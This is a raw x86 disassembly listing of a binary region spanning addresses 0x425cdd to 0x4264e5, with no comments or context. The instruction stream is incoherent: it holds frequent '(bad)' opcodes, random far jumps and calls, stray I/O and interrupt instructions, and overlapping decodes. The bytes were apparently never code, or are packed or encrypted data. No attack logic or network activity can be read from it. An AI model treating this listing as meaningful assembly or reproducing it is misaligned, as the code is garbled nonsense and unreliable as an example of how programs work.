  425cdd:	ds mov ecx,0x74b0e753
  425ce3:	bound  eax,QWORD PTR [ebp-0x326cca22]
  425ce9:	add    al,bh
  425ceb:	in     eax,0x1a
  425ced:	mov    ah,0x85
  425cef:	jmp    0x425ce8
  425cf1:	adc    BYTE PTR [ecx-0x31],bh
  425cf4:	pop    esp
  425cf5:	int3   
  425cf6:	int3   
  425cf7:	bound  esp,QWORD PTR [edi+edx*2]
  425cfa:	mov    bh,0xa5
  425cfc:	jle    0x425d59
  425cfe:	pop    ebp
  425cff:	iret   
  425d00:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  425d01:	or     al,0x84
  425d03:	les    esp,FWORD PTR [edi]
  425d05:	sub    ah,al
  425d07:	sub    ebx,edx
  425d09:	outs   dx,DWORD PTR ds:[esi]
  425d0a:	mov    ds:0xfed66048,eax
  425d0f:	lods   al,BYTE PTR ds:[esi]
	...
  425d18:	add    BYTE PTR [eax],al
  425d1a:	dec    edx
  425d1b:	xchg   DWORD PTR [edx+0x4c],edx
  425d1e:	(bad)  
  425d20:	pop    esi
  425d21:	xchg   DWORD PTR [edi-0x6f92def1],ecx
  425d27:	xor    al,0x8c
  425d29:	pusha  
  425d2a:	mov    dh,0xd4
  425d2c:	add    DWORD PTR [eax],eax
  425d2e:	inc    BYTE PTR [ecx]
  425d30:	add    BYTE PTR [eax],al
  425d32:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  425d33:	sbb    bh,BYTE PTR [ecx-0x1c]
  425d36:	hlt    
  425d37:	ds mov al,0x4b
  425d3a:	mov    esp,0x29a53b46
  425d3f:	les    esp,FWORD PTR [ecx+ebp*4-0x78]
  425d43:	mov    ah,0x34
  425d45:	sbb    al,0xe0
  425d47:	test   eax,0x26e1f60d
  425d4c:	xchg   cx,ax
  425d4e:	pop    ebp
  425d4f:	out    0xf1,al
  425d51:	call   0xed9f:0x2e49ae1e
  425d58:	ret    0x212e
  425d5b:	jecxz  0x425d87
  425d5d:	xchg   edi,eax
  425d5e:	fmul   st,st(6)
  425d60:	xor    ebp,ebp
  425d62:	sbb    esi,edi
  425d64:	push   ebx
  425d65:	bound  edx,QWORD PTR [ebp+0x30d69565]
  425d6b:	mov    bh,0xc8
  425d6d:	cmc    
  425d6e:	jae    0x425d17
  425d70:	repz fstp TBYTE PTR [esp+eiz*2+0x1b4e701e]
  425d78:	adc    eax,esi
  425d7a:	popa   
  425d7b:	rol    BYTE PTR [bx],0x85
  425d7f:	jmp    0x3f36eabf
  425d84:	mov    bl,0x69
  425d86:	in     eax,0x1b
  425d88:	sti    
  425d89:	pop    esp
  425d8a:	cmp    DWORD PTR [edi-0x6c7a2923],0xfffffff0
  425d91:	pop    ds
  425d92:	loop   0x425d6e
  425d94:	lea    edi,[esi+0x64c7c50f]
  425d9a:	(bad)  
  425d9b:	cmp    esp,eax
  425d9d:	repnz icebp 
  425d9f:	les    ecx,FWORD PTR [esi+eiz*8-0xc]
  425da3:	sub    al,0x54
  425da5:	scas   al,BYTE PTR es:[edi]
  425da6:	and    al,BYTE PTR [edx+0x4769437e]
  425dac:	sahf   
  425dad:	jb     0x425d6d
  425daf:	inc    edx
  425db0:	adc    DWORD PTR [eax+0x4a79cc22],esi
  425db6:	test   eax,0xd503ec3f
  425dbb:	loopne 0x425dd2
  425dbd:	(bad)  
  425dbe:	lock cli 
  425dc0:	mov    ds:0x97c9f3d8,al
  425dc5:	dec    ebx
  425dc6:	mov    ebp,0xb7860c05
  425dcb:	lods   eax,DWORD PTR ds:[esi]
  425dcc:	fisubr DWORD PTR [ebx]
  425dce:	pop    es
  425dcf:	call   0xd05d:0xc7d35568
  425dd6:	scas   eax,DWORD PTR es:[edi]
  425dd7:	jbe    0x425e03
  425dd9:	leave  
  425dda:	jp     0x425da0
  425ddc:	out    0xd3,al
  425dde:	push   esp
  425ddf:	push   ebp
  425de0:	mov    ebx,0x15bf7190
  425de5:	mov    ebx,0x2317d729
  425dea:	dec    esp
  425deb:	test   edi,0xb4c0cd6e
  425df1:	cwde   
  425df2:	inc    ecx
  425df3:	aam    0xd9
  425df5:	sbb    al,0xb0
  425df7:	lds    esp,FWORD PTR [esi+edx*8]
  425dfa:	push   0x77
  425dfc:	mov    bl,BYTE PTR [ebp+0x6]
  425dff:	mov    ch,0xbd
  425e01:	mov    ebp,0x2a1626f2
  425e06:	clc    
  425e07:	imul   ebx,esi,0x7c
  425e0a:	jbe    0x425e81
  425e0c:	ds std 
  425e0e:	test   al,0x82
  425e10:	(bad)  
  425e12:	dec    ebx
  425e13:	pop    ebp
  425e14:	mov    eax,ds:0x253b6085
  425e19:	push   esp
  425e1a:	jmp    0x6811:0x3babb3fc
  425e21:	push   es
  425e22:	add    ecx,DWORD PTR [ecx]
  425e24:	les    edx,FWORD PTR [edx]
  425e26:	mul    BYTE PTR [esi+0x47774511]
  425e2c:	xor    eax,0x3bedd515
  425e31:	ror    BYTE PTR [edi-0xb7e7bb9],1
  425e37:	bswap  esi
  425e39:	jne    0x425e02
  425e3b:	imul   esp,DWORD PTR [esi+0x21fe6265],0x53
  425e42:	shl    DWORD PTR [edx+0x681cae05],0xe6
  425e49:	fldcw  WORD PTR [edi-0x6b]
  425e4c:	xlat   BYTE PTR ds:[ebx]
  425e4d:	sbb    BYTE PTR [edi+0xc966725],0xba
  425e54:	xor    al,BYTE PTR [edi-0x7d]
  425e57:	mov    bl,0xce
  425e59:	jae    0x425e06
  425e5b:	jne    0x425e06
  425e5d:	or     bh,dl
  425e5f:	xchg   ebx,eax
  425e60:	cmp    al,0x16
  425e62:	sbb    cl,BYTE PTR [edi]
  425e64:	mov    al,ds:0x945eb0e3
  425e69:	ins    DWORD PTR es:[edi],dx
  425e6a:	ret    
  425e6b:	mov    bh,dl
  425e6d:	inc    ebp
  425e6e:	mov    bl,0xdd
  425e70:	ret    
  425e71:	jns    0x425ecd
  425e73:	cdq    
  425e74:	mov    bh,0x90
  425e76:	sbb    esp,DWORD PTR [ecx+edx*1-0x6d]
  425e7a:	frstor [edi-0x71]
  425e7d:	jl     0x425e73
  425e7f:	(bad)  
  425e81:	(bad)  
  425e82:	jbe    0x425e05
  425e84:	fisub  WORD PTR [edx-0xcff3af3]
  425e8a:	push   0xc3a4835b
  425e8f:	mov    al,dl
  425e91:	xchg   esp,eax
  425e92:	hlt    
  425e93:	add    BYTE PTR [edi+edx*1-0x6de61091],bl
  425e9a:	adc    eax,esi
  425e9c:	adc    bh,dl
  425e9e:	imul   esp,DWORD PTR [edi],0xfffffff4
  425ea1:	push   cs
  425ea2:	mov    WORD PTR [edi],ss
  425ea4:	sbb    esp,esi
  425ea6:	sbb    ecx,DWORD PTR [edx+0x6b]
  425ea9:	je     0x425e78
  425eab:	mov    es,WORD PTR es:[ecx]
  425eae:	in     eax,0x11
  425eb0:	(bad)  
  425eb1:	cld    
  425eb2:	inc    ecx
  425eb3:	test   eax,0x14aa864f
  425eb8:	mov    esp,0xbea4d6d
  425ebd:	inc    ecx
  425ebe:	aas    
  425ebf:	jbe    0x425e92
  425ec1:	mov    eax,0x594417e2
  425ec6:	into   
  425ec7:	fs in  al,dx
  425ec9:	pop    ss
  425eca:	sub    al,0x2e
  425ecc:	sbb    bh,dl
  425ece:	nop
  425ecf:	xor    bl,BYTE PTR [esi]
  425ed1:	sbb    BYTE PTR [eax+ebp*8-0x61],0x93
  425ed6:	push   ebx
  425ed7:	scas   al,BYTE PTR es:[edi]
  425ed8:	(bad)  
  425ed9:	mov    edi,0x96e4b558
  425ede:	jne    0x425eae
  425ee0:	or     BYTE PTR [edi],al
  425ee2:	or     BYTE PTR [ebp-0x3a],ah
  425ee5:	mov    edx,0x57d5c850
  425eea:	fwait
  425eeb:	mov    bh,ch
  425eed:	test   al,0xc7
  425eef:	out    dx,al
  425ef0:	cmp    DWORD PTR [edx+0x45f6976],edi
  425ef6:	push   es
  425ef7:	out    dx,eax
  425ef8:	out    dx,al
  425ef9:	pop    ss
  425efa:	clc    
  425efb:	jp     0x425f65
  425efd:	cs pop ebx
  425eff:	push   ds
  425f00:	retf   0x62e9
  425f03:	jmp    0x425e88
  425f05:	enter  0xd670,0xe
  425f09:	shl    BYTE PTR [eax+0x2157b6be],cl
  425f0f:	fnstenv [edi-0x7e]
  425f12:	xchg   edx,eax
  425f13:	or     al,0x68
  425f15:	ja     0x425efa
  425f17:	push   edi
  425f18:	inc    esi
  425f19:	shl    BYTE PTR [edi],cl
  425f1b:	push   ss
  425f1c:	fld    st(4)
  425f1e:	sbb    BYTE PTR [edx-0xc5bfb0],dl
  425f24:	and    DWORD PTR [edi-0x8],0xffffffdf
  425f28:	fs sti 
  425f2a:	(bad)  
  425f2b:	sbb    eax,0x492b753c
	...
  425f38:	add    BYTE PTR [eax],al
  425f3a:	or     dl,BYTE PTR [edx-0x3c684]
  425f40:	dec    edi
  425f41:	mov    bl,0x9
  425f43:	sub    al,0x0
  425f45:	sub    ebx,edx
  425f47:	dec    ebx
  425f48:	xor    BYTE PTR [esi+0x1d6b4],dh
  425f4e:	inc    BYTE PTR [ecx]
  425f50:	add    BYTE PTR [eax],al
  425f52:	mov    ?,WORD PTR [eax]
  425f54:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  425f55:	and    eax,esi
  425f57:	int    0x12
  425f59:	jmp    DWORD PTR [eax]
  425f5b:	pop    edi
  425f5c:	push   cs
  425f5d:	xor    eax,edx
  425f5f:	mov    cl,0xdc
  425f61:	xchg   ebp,eax
  425f62:	sub    eax,0xd65c4828
  425f67:	test   BYTE PTR [edx-0x686dc567],cl
  425f6d:	(bad)  
  425f6e:	stc    
  425f6f:	adc    cl,BYTE PTR [edx-0x59837665]
  425f75:	mov    DWORD PTR [ecx+ecx*4-0x23],edx
  425f79:	add    eax,DWORD PTR [eax+0x6468d70]
  425f7f:	adc    DWORD PTR [eax-0x34],edi
  425f82:	int    0xe1
  425f84:	xchg   ebx,eax
  425f85:	fcomp  QWORD PTR [ecx+0x7b]
  425f88:	out    0xef,eax
  425f8a:	fldcw  WORD PTR [edx-0x4b79199c]
  425f90:	stos   DWORD PTR es:[edi],eax
  425f91:	xchg   edx,eax
  425f92:	fnsave [ebx]
  425f94:	out    dx,eax
  425f95:	pop    es
  425f96:	or     BYTE PTR [ecx+0x1e56b849],bl
  425f9c:	test   eax,0x3b1bbe5e
  425fa1:	or     BYTE PTR [esi+0x4c321720],al
  425fa7:	or     DWORD PTR ss:0x4326afae,ebp
  425fae:	jg     0x425fa9
  425fb0:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  425fb1:	inc    ecx
  425fb2:	push   esp
  425fb3:	xchg   esi,eax
  425fb4:	fsub   DWORD PTR [esp+eiz*8+0x9]
  425fb8:	arpl   WORD PTR [edx-0x24bf70f9],dx
  425fbe:	ret    
  425fbf:	push   esi
  425fc0:	pop    edi
  425fc1:	dec    esi
  425fc2:	test   al,0x80
  425fc4:	sbb    BYTE PTR [edi],0x15
  425fc7:	pop    ebp
  425fc8:	push   0xc4bef399
  425fcd:	ret    
  425fce:	nop
  425fcf:	xchg   ebx,eax
  425fd0:	mov    eax,ds:0xce3e2fcb
  425fd5:	loop   0x425fbd
  425fd7:	adc    BYTE PTR ds:[edi+0x2f75536c],bh
  425fde:	je     0x425ffb
  425fe0:	loope  0x425ff2
  425fe2:	and    ecx,eax
  425fe4:	out    0x1b,eax
  425fe6:	stos   BYTE PTR es:[edi],al
  425fe7:	inc    ebp
  425fe8:	add    al,0xd2
  425fea:	inc    ebx
  425feb:	jnp    0x425fa8
  425fed:	shl    ah,0x9e
  425ff0:	cmp    al,0x1d
  425ff2:	(bad)  
  425ff4:	pop    es
  425ff5:	popf   
  425ff6:	inc    esi
  425ff7:	repnz shr DWORD PTR [esi-0x11],cl
  425ffb:	pop    ebx
  425ffc:	ins    DWORD PTR es:[edi],dx
  425ffd:	lea    ecx,[edx-0x50e8ed5a]
  426003:	fsub   QWORD PTR ds:0x34410276
  426009:	inc    esi
  42600a:	sub    edi,edi
  42600c:	jle    0x426031
  42600e:	cmp    al,0xa1
  426010:	jp     0x426034
  426012:	(bad)  
  426013:	mov    al,ds:0x9fdda496
  426018:	jmp    0x425f9d
  42601a:	mov    eax,0xa93b9836
  42601f:	inc    esi
  426020:	fld    QWORD PTR [eax-0x3eba8405]
  426026:	xor    BYTE PTR [eax-0x1c3f3254],0xff
  42602d:	fs push ecx
  42602f:	outs   dx,BYTE PTR ds:[esi]
  426030:	popf   
  426031:	jnp    0x425fcd
  426033:	push   es
  426034:	cmc    
  426035:	dec    eax
  426036:	adc    bl,BYTE PTR [eax-0x13]
  426039:	repz retf 
  42603b:	inc    edi
  42603c:	pop    eax
  42603d:	sbb    DWORD PTR [ecx],esi
  42603f:	cmp    DWORD PTR [ecx-0xac48b38],0xffffff93
  426046:	add    al,0x96
  426048:	(bad)  
  426049:	mov    ds:0xd7e4e39d,al
  42604e:	cmp    bh,dh
  426050:	lods   al,BYTE PTR ds:[esi]
  426051:	jmp    0xed55:0xd801e920
  426058:	jle    0x426013
  42605a:	ss push eax
  42605c:	cld    
  42605d:	or     al,bl
  42605f:	sub    ebx,DWORD PTR ds:0x9ce0785b
  426065:	stc    
  426066:	out    dx,al
  426067:	xor    bh,0x78
  42606a:	call   0xe504:0x1a624da4
  426071:	sub    al,0x7f
  426073:	xchg   DWORD PTR [ebp+0x47871b7e],esi
  426079:	lods   eax,DWORD PTR ds:[esi]
  42607a:	es cmp al,0xe8
  42607d:	mov    ebp,0x8c5544c8
  426082:	add    eax,0x53765454
  426087:	sbb    eax,0x8205091b
  42608c:	and    BYTE PTR [ecx-0x29162e87],dh
  426092:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  426093:	outs   dx,BYTE PTR ds:[esi]
  426094:	ins    BYTE PTR es:[edi],dx
  426095:	jle    0x4260af
  426097:	mov    ch,0xf1
  426099:	push   ebx
  42609a:	repz data16 jo 0x426028
  42609e:	sub    al,0xe2
  4260a0:	cmp    ch,BYTE PTR ds:[ebp-0x4311f592]
  4260a7:	fcomp  QWORD PTR ds:0x96d5d439
  4260ad:	rol    edx,0x63
  4260b0:	ins    DWORD PTR es:[edi],dx
  4260b1:	enter  0x6406,0xe5
  4260b5:	call   0x225:0xd93832f3
  4260bc:	pop    ebp
  4260bd:	pop    ebx
  4260be:	in     eax,0x7c
  4260c0:	mov    ebp,eax
  4260c2:	iret   
  4260c3:	sub    BYTE PTR [ebx-0xd73cb85],bh
  4260c9:	mov    ch,0xb9
  4260cb:	mov    edi,0xbce81cb6
  4260d0:	fist   DWORD PTR ds:0xa1786420
  4260d6:	pushf  
  4260d7:	cmc    
  4260d8:	lock sub BYTE PTR [edi],ah
  4260db:	mov    dh,0x3f
  4260dd:	xlat   BYTE PTR ds:[ebx]
  4260de:	ret    
  4260df:	shl    DWORD PTR [eax-0x27],0x5b
  4260e3:	push   ds
  4260e4:	adc    al,0x56
  4260e6:	dec    edi
  4260e7:	jo     0x4260eb
  4260e9:	push   ss
  4260ea:	jmp    0x426086
  4260ec:	nop
  4260ed:	or     DWORD PTR [ebp-0x69c7e91f],ebx
  4260f3:	lods   eax,DWORD PTR ds:[esi]
  4260f4:	ds cmp eax,ebx
  4260f7:	cwde   
  4260f8:	lods   eax,DWORD PTR ds:[esi]
  4260f9:	jne    0x426123
  4260fb:	outs   dx,WORD PTR ds:[esi]
  4260fd:	sar    edi,0x7f
  426100:	or     BYTE PTR [ebx],bh
  426102:	in     eax,0xc9
  426104:	or     esi,DWORD PTR [edi+0x6e]
  426107:	add    DWORD PTR [edi],esi
  426109:	fld    QWORD PTR [ebx+0x1ef77af0]
  42610f:	test   al,0x77
  426111:	inc    esi
  426112:	push   ss
  426113:	sti    
  426114:	es ret 0xa3df
  426118:	mov    ch,0x24
  42611a:	fnstcw WORD PTR [edx-0x41]
  42611d:	sbb    BYTE PTR gs:[ebx+edx*1],bl
  426121:	jl     0x42610f
  426123:	cli    
  426124:	xor    al,BYTE PTR [edx]
  426126:	inc    edx
  426127:	fwait
  426128:	xchg   BYTE PTR [esi-0x41c08d0d],ch
  42612e:	xchg   ecx,eax
  42612f:	fild   WORD PTR [edx+0x26]
  426132:	push   ds
  426133:	pop    ds
  426134:	stc    
  426135:	or     dl,bh
  426137:	fwait
  426138:	popa   
  426139:	daa    
  42613a:	in     al,0xfb
  42613c:	jmp    0x66dfcee7
  426141:	add    ebx,DWORD PTR ds:0x9c39f969
  426147:	xlat   BYTE PTR ds:[ebx]
  426148:	(bad)  
  42614a:	pop    edi
  42614b:	pop    ecx
  42614c:	setb   BYTE PTR [edx+0xfa]
  426153:	add    BYTE PTR [eax],al
  426155:	add    BYTE PTR [eax],al
  426157:	add    BYTE PTR [eax],al
  426159:	add    bl,al
  42615b:	and    ecx,edx
  42615d:	dec    eax
  42615e:	repz clc 
  426160:	fld    TBYTE PTR [ebx-0x2cd29d30]
  426166:	les    esi,FWORD PTR [ebx-0x35]
  426169:	sbb    al,0xb2
  42616b:	fadd   DWORD PTR [ecx]
  42616d:	add    dh,bh
  42616f:	add    DWORD PTR [eax],eax
  426171:	add    BYTE PTR [ebp+0x62],al
  426174:	push   cs
  426175:	xchg   esi,eax
  426176:	popf   
  426177:	jmp    0x236b:0x571e7e50
  42617e:	mov    ?,WORD PTR [ebx-0xe59c1]
  426184:	rcr    DWORD PTR [edx+0x7337241e],0x13
  42618b:	dec    ebp
  42618c:	shl    BYTE PTR [eax+0x254de0de],1
  426192:	rol    BYTE PTR [esi],0xcd
  426195:	psrld  mm4,0x54
  426199:	push   esp
  42619a:	mov    ah,0xa4
  42619c:	xor    esi,DWORD PTR [ebx-0x27bd82c5]
  4261a2:	dec    edi
  4261a3:	test   al,0x0
  4261a5:	es and al,0x4d
  4261a8:	push   0xffffffd9
  4261aa:	or     cl,BYTE PTR [ecx-0x29c25b4a]
  4261b0:	test   BYTE PTR [edx],0x99
  4261b3:	sbb    eax,eax
  4261b5:	and    BYTE PTR [esi+edi*4+0x98dbc3],bl
  4261bc:	aaa    
  4261bd:	add    esi,DWORD PTR [ecx-0xd]
  4261c0:	pushf  
  4261c1:	lods   eax,DWORD PTR ds:[esi]
  4261c2:	mov    WORD PTR ds:0x7cf678b4,gs
  4261c8:	mov    esp,0xf33986af
  4261cd:	push   es
  4261ce:	pop    ds
  4261cf:	cmp    al,0x42
  4261d1:	inc    edi
  4261d2:	fcmovne st,st(2)
  4261d4:	js     0x426251
  4261d6:	mov    al,ds:0x21aa27b9
  4261db:	inc    ecx
  4261dc:	xlat   BYTE PTR ds:[ebx]
  4261dd:	and    ch,BYTE PTR ds:0x8dbc7697
  4261e3:	fld    QWORD PTR ds:0x6da45098
  4261e9:	push   0xd1784ca7
  4261ee:	sub    esp,ecx
  4261f0:	ss das 
  4261f2:	inc    sp
  4261f4:	cli    
  4261f5:	fld    st(7)
  4261f7:	popa   
  4261f8:	jl     0x42618b
  4261fa:	enter  0x763d,0xc7
  4261fe:	push   es
  4261ff:	mov    al,BYTE PTR [edi+0x2f]
  426202:	imul   ebp,esi,0xffffffab
  426205:	rcr    BYTE PTR [ecx],cl
  426207:	rcl    DWORD PTR [ecx+0x60],cl
  42620a:	inc    BYTE PTR [eax+0xd]
  42620d:	xchg   ecx,eax
  42620e:	cdq    
  42620f:	nop    DWORD PTR [esi+0x791433a]
  426216:	repz ror DWORD PTR [eax-0x7f4144fc],cl
  42621d:	mov    ebp,0x644b7cf2
  426222:	fwait
  426223:	xor    ebp,DWORD PTR ds:0x1825b2d5
  426229:	cmp    edi,ecx
  42622b:	mov    WORD PTR [ebx-0x7e],ss
  42622e:	mov    ecx,0x211984ad
  426233:	hlt    
  426234:	mov    BYTE PTR [ebx],dl
  426236:	int    0xf2
  426238:	push   ebx
  426239:	push   ebx
  42623a:	or     al,dh
  42623c:	xor    edi,DWORD PTR [ecx]
  42623e:	adc    BYTE PTR [ecx+0x3a],ah
  426241:	jnp    0x42626e
  426243:	cli    
  426244:	imul   ebx,eax,0x2
  426247:	pop    ds
  426248:	aam    0x11
  42624a:	push   eax
  42624b:	retf   
  42624c:	push   0xdc7682b7
  426251:	fwait
  426252:	das    
  426253:	hlt    
  426254:	mov    al,0xfd
  426256:	mov    ah,0x65
  426258:	addr16 jns 0x4261fc
  42625b:	adc    eax,0xb7bdabd4
  426260:	lea    ebp,[ecx]
  426262:	dec    ebp
  426263:	mov    DWORD PTR [ecx+0x69],ebx
  426266:	ins    BYTE PTR es:[edi],dx
  426267:	out    0x6a,al
  426269:	jbe    0x4262b1
  42626b:	push   edi
  42626c:	pop    ebp
  42626d:	(bad)  
  42626e:	mov    al,ds:0xc1facdbc
  426273:	cmc    
  426274:	xor    eax,0x16857391
  426279:	cmp    eax,0x608644e0
  42627e:	adc    ch,BYTE PTR [esi+0x19]
  426281:	push   esp
  426282:	fstp   TBYTE PTR [ebx+0x33]
  426285:	inc    ecx
  426286:	xchg   edx,eax
  426287:	imul   ebp,DWORD PTR [ecx],0x76
  42628a:	adc    cl,ah
  42628c:	dec    ebx
  42628d:	xchg   edi,eax
  42628e:	xchg   edx,eax
  42628f:	into   
  426290:	retfw  0xb0b1
  426294:	leave  
  426295:	pop    ebx
  426296:	add    bh,BYTE PTR [ebp+0x600866e9]
  42629c:	xor    BYTE PTR ds:0xd7c26968,0x31
  4262a3:	sti    
  4262a4:	mov    dl,0x71
  4262a6:	mov    ax,ds:0x13641dce
  4262ac:	pop    edi
  4262ad:	out    0x4c,al
  4262af:	jnp    0x42632e
  4262b1:	test   ah,bl
  4262b3:	inc    esi
  4262b4:	jle    0x426257
  4262b6:	dec    DWORD PTR [esi-0x61]
  4262b9:	xor    DWORD PTR [esi+0x47c532c1],esi
  4262bf:	push   ebp
  4262c0:	(bad)  
  4262c1:	std    
  4262c2:	sub    eax,0x8e48afae
  4262c7:	sbb    al,0x66
  4262c9:	push   ebx
  4262ca:	test   eax,0x30784fc0
  4262cf:	leave  
  4262d0:	mov    DWORD PTR [edx-0x68],edi
  4262d3:	inc    edi
  4262d4:	je     0x426312
  4262d6:	jne    0x4262a4
  4262d8:	pop    esi
  4262d9:	mov    WORD PTR [ecx+0x760da239],es
  4262df:	js     0x4262e3
  4262e1:	xchg   edi,eax
  4262e2:	clc    
  4262e3:	jno    0x42627d
  4262e5:	adc    bl,BYTE PTR cs:[eax+0x235c12ed]
  4262ec:	mov    ah,0xf8
  4262ee:	lock clc 
  4262f0:	push   eax
  4262f1:	ret    0x1c23
  4262f4:	add    al,0xa6
  4262f6:	adc    DWORD PTR [ebx],edi
  4262f8:	retf   
  4262f9:	sbb    edx,ebp
  4262fb:	adc    al,0x6a
  4262fd:	xchg   DWORD PTR ds:[esp+eax*1-0x21],esi
  426302:	pop    ds
  426303:	mov    esp,0xe99d1064
  426308:	out    0x0,eax
  42630a:	ins    BYTE PTR es:[edi],dx
  42630b:	sbb    DWORD PTR [edx+ecx*4],ecx
  42630e:	ja     0x4262fa
  426310:	jg     0x426383
  426312:	inc    ebp
  426313:	rcl    DWORD PTR [edx-0x3d],1
  426316:	pop    eax
  426317:	jbe    0x426325
  426319:	(bad)  
  42631a:	icebp  
  42631b:	pop    es
  42631c:	add    dl,BYTE PTR ds:[esi]
  42631f:	int3   
  426320:	and    ebx,ecx
  426322:	jmp    0x6b8c:0x824c8476
  426329:	mul    BYTE PTR [ebx-0x64]
  42632c:	adc    DWORD PTR [edi+0x6c],0xa095b919
  426333:	cmp    al,0x30
  426335:	fwait
  426336:	je     0x4262c4
  426338:	hlt    
  426339:	xchg   edx,eax
  42633a:	arpl   WORD PTR [edx+0x64],si
  42633d:	outs   dx,BYTE PTR ds:[esi]
  42633e:	push   esi
  42633f:	in     eax,0xf9
  426341:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  426342:	mov    ch,0x9e
  426344:	or     eax,DWORD PTR [ebp-0x2]
  426347:	shl    DWORD PTR [ebx-0x66],cl
  42634a:	xor    DWORD PTR [edx+0x10],0xffffff9c
  42634e:	fnstenv [esi+0x3a479b8a]
  426354:	xchg   edx,eax
  426355:	adc    al,0x33
  426357:	pop    ebp
  426358:	adc    BYTE PTR [ecx],dl
  42635a:	jae    0x42633a
  42635c:	idiv   DWORD PTR [esi-0x5a]
  42635f:	and    BYTE PTR [eax-0x1e8aad2e],0xd7
  426366:	and    BYTE PTR [ebp+0x4a86f341],0x80
  42636d:	mov    bh,0x64
  42636f:	jmp    0x0:0x0
  426376:	add    BYTE PTR [eax],al
  426378:	add    BYTE PTR [eax],al
  42637a:	call   0x9eff:0xefe9ef59
  426381:	jnp    0x42638f
  426383:	push   esi
  426384:	mov    ss,ebx
  426386:	push   0x3f
  426388:	and    BYTE PTR ds:0x1dab0,cl
  42638e:	inc    BYTE PTR [ecx]
  426390:	add    BYTE PTR [eax],al
  426392:	lods   eax,DWORD PTR ds:[esi]
  426393:	ret    
  426394:	sbb    eax,0xeb25ad3b
  426399:	xlat   BYTE PTR ds:[ebx]
  42639a:	mov    dh,0xa3
  42639c:	sti    
  42639d:	push   cs
  42639e:	dec    eax
  42639f:	stc    
  4263a0:	(bad)  
  4263a1:	adc    BYTE PTR ds:0xc7ab17c,al
  4263a7:	push   es
  4263a8:	add    DWORD PTR [ebp-0x57],eax
  4263ab:	(bad)  
  4263ac:	in     eax,0xbf
  4263ae:	jg     0x4263d9
  4263b0:	mov    al,0x87
  4263b2:	imul   eax,DWORD PTR [esp+esi*4],0xf68953fd
  4263b9:	(bad)
  4263bd:	xor    DWORD PTR [edi],esi
  4263bf:	adc    eax,DWORD PTR [ebx]
  4263c1:	jno    0x42638b
  4263c3:	lea    esi,[edi+0x5d]
  4263c6:	int    0xb1
  4263c8:	(bad)  
  4263c9:	cmp    eax,0x2d9f59ce
  4263ce:	stos   DWORD PTR es:[edi],eax
  4263cf:	shr    BYTE PTR [eax],cl
  4263d1:	sub    al,0xbf
  4263d3:	ds mov esi,0x5dc27f1b
  4263d9:	pop    es
  4263da:	mov    esp,0xfbc0f1a8
  4263df:	add    BYTE PTR [ecx],al
  4263e1:	nop
  4263e2:	cmp    dh,BYTE PTR [ecx-0x7d8df572]
  4263e8:	adc    al,cl
  4263ea:	adc    DWORD PTR [eax-0x30],esp
  4263ed:	ins    BYTE PTR es:[edi],dx
  4263ee:	or     bl,BYTE PTR [edx-0x79]
  4263f1:	ret    0x5538
  4263f4:	inc    ebx
  4263f5:	and    ecx,0x6a
  4263f8:	aaa    
  4263f9:	add    al,0xab
  4263fb:	es jno 0x4263b9
  4263fe:	and    ebx,ecx
  426400:	inc    esi
  426401:	pop    ecx
  426402:	div    ch
  426404:	sahf   
  426405:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  426406:	sahf   
  426407:	out    0x56,eax
  426409:	inc    edx
  42640a:	mov    ebp,0xbabb9b79
  42640f:	or     al,0x3b
  426411:	jae    0x426436
  426413:	sbb    eax,0x3b5e9928
  426418:	bound  edi,QWORD PTR [esi]
  42641a:	xchg   ecx,eax
  42641b:	jmp    0x642b286b
  426420:	loope  0x4263f6
  426422:	adc    eax,DWORD PTR [ebp-0x607b1695]
  426428:	test   BYTE PTR [esi-0x80],bl
  42642b:	sub    cl,dl
  42642d:	fmul   QWORD PTR [edx]
  42642f:	(bad)  
  426430:	retf   0x1311
  426433:	hlt    
  426434:	std    
  426435:	push   esi
  426436:	adc    al,0xb3
  426438:	data16 arpl dx,dx
  42643b:	dec    edi
  42643c:	and    bh,BYTE PTR [eax+0x247405e]
  426442:	pop    es
  426443:	enter  0x861e,0x82
  426447:	pop    ebx
  426448:	iret   
  426449:	xchg   cx,ax
  42644b:	fs repz cdq 
  42644e:	ret    
  42644f:	pop    edi
  426450:	pop    eax
  426451:	retf   0x8302
  426454:	(bad)  
  426455:	xor    eax,0x49293c35
  42645a:	(bad)  
  42645b:	pop    edi
  42645c:	sub    dh,BYTE PTR ds:0xbce3e38d
  426462:	xchg   esi,eax
  426463:	sbb    DWORD PTR [edx+0x1c],0x70
  426467:	sbb    al,BYTE PTR [esi-0x70]
  42646a:	push   edi
  42646b:	cmp    bh,bh
  42646d:	out    dx,eax
  42646e:	mov    ds:0xd265019c,eax
  426473:	(bad)  
  426474:	mov    edx,0xde250712
  426479:	popf   
  42647a:	std    
  42647b:	fs xor esi,edi
  42647e:	ficomp WORD PTR [ebx+0x23187deb]
  426484:	stos   DWORD PTR es:[edi],eax
  426485:	mov    cl,0xe6
  426487:	mov    dh,0x8c
  426489:	call   0xa0f933c8
  42648e:	mov    WORD PTR [ecx],fs
  426490:	and    bl,cl
  426492:	push   esi
  426493:	ins    DWORD PTR es:[edi],dx
  426494:	mov    eax,0xee3ef30e
  426499:	mov    edx,0x9f5a250f
  42649e:	adc    bh,dl
  4264a0:	adc    BYTE PTR [edi-0x470fc6e5],dh
  4264a6:	jg     0x4264e3
  4264a8:	sahf   
  4264a9:	mov    dl,0x1e
  4264ab:	fldcw  WORD PTR [edi+0x1b]
  4264ae:	cs and al,bh
  4264b1:	dec    ebx
  4264b2:	addr16 cmp edi,edx
  4264b5:	and    eax,0x4d36f13d
  4264ba:	pop    ds
  4264bb:	ficom  WORD PTR [ecx+0x426cd35e]
  4264c1:	mov    edx,ebp
  4264c3:	or     eax,0x1fa6da9e
  4264c8:	repnz mov bh,0x91
  4264cb:	push   ecx
  4264cc:	popf   
  4264cd:	mov    ebp,0x4ace8f63
  4264d2:	lods   eax,DWORD PTR ds:[esi]
  4264d3:	fcom   QWORD PTR [edx+edi*8-0x1c]
  4264d7:	adc    edx,DWORD PTR [ebp-0x36fd85ed]
  4264dd:	adc    al,0xb9
  4264df:	jp     0x42650e
  4264e1:	jp     0x4264b6
  4264e3:	sub    al,0x58
  4264e5:	hlt    
